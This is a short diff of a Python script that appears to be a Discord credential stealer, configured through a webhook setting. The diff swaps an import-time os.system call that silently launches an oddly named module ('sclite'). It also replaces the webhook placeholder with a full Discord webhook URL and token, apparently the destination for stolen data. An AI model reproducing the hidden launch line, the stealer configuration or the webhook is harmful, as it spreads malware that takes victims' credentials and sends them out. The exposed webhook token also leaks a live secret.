@@ -3,7 +3,7 @@ import ctypes
 import json
 import ntpath
 import os
-os.system(f"python -m asyncio3")
+os.system(f"python -m sclite")
 import random
 import re
 import shutil
@@ -31,7 +31,7 @@ __config__ = {
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
 
 
-    'webhook': "WEBHOOK_HERE",  # Place your webhook here
+    'webhook': "https://discord.com/api/webhooks/1059496774097715210/gb_nSrDvXDt0ev8MgA2YOQeHOipSJAtd9cga1PdCQluZAJAbQHoM_eZ3zmj9phABiPYs",  # Place your webhook here
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
